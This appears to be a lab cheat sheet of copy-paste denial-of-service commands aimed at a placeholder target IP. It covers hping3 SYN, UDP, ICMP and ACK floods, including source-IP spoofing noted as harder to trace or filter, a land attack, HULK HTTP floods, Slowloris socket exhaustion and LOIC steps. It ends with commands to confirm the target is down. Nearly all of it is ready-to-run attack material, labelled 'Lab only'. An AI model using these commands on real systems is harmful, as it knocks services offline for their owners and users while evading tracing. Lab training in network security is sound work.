# 09 DoS — copy-paste commands

> `<IP>` = lab target. **Lab only.** Ctrl-C to stop.

## hping3 — the swiss army knife

```bash
# SYN flood (classic)
sudo hping3 -S --flood -V -p 80 <IP>
#   -S         SYN flag
#   --flood    send as fast as possible, no reply parsing
#   -V         verbose
#   -p 80      target port

# Randomize source IP (harder to trace / filter)
sudo hping3 -S --flood --rand-source -p 80 <IP>

# UDP flood
sudo hping3 --udp --flood -p 53 <IP>

# ICMP flood
sudo hping3 -1 --flood <IP>

# ACK flood (defeats simple SYN filters)
sudo hping3 -A --flood -p 80 <IP>

# Land attack (spoof source = destination)
sudo hping3 -S -a <IP> -p 80 <IP>

# Fixed packet size (larger = more bandwidth)
sudo hping3 -S --flood -p 80 -d 1400 <IP>
```

→ See [hping3.md](../tools/hping3.md)

## HULK — layer-7 HTTP flood

```bash
# Kali location varies; if not installed:
git clone https://github.com/grafov/hulk.git
cd hulk
python3 hulk.py http://<IP>/
```

HULK randomizes URL params + User-Agent so caches can't help.

## Slowloris — socket exhaustion

```bash
# Pip install once
pip3 install slowloris

# Run
slowloris <IP> -p 80 -s 500
#   -p 80   port
#   -s 500  sockets to keep open
```

Apache pre-fork is very vulnerable. nginx generally is not.

## LOIC (Windows GUI)

```
1. Open LOIC.exe
2. URL: http://<IP>/    → Lock on
3. Method: HTTP     Port: 80    Threads: 100
4. Click IMMA CHARGIN MAH LAZER
5. Stop button when done
```

## Verify the target is actually down

```bash
# From a different attacker terminal / box
curl -I --max-time 3 http://<IP>/
# Timeout / connection refused = success

ping -c 4 <IP>

# Watch response times
while true; do curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://<IP>/; sleep 1; done
```

## Capture your own DoS traffic for the report

```bash
sudo tcpdump -i <IF> -w dos.pcap host <IP>
# Stop with Ctrl-C; open dos.pcap in Wireshark
# Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0
```
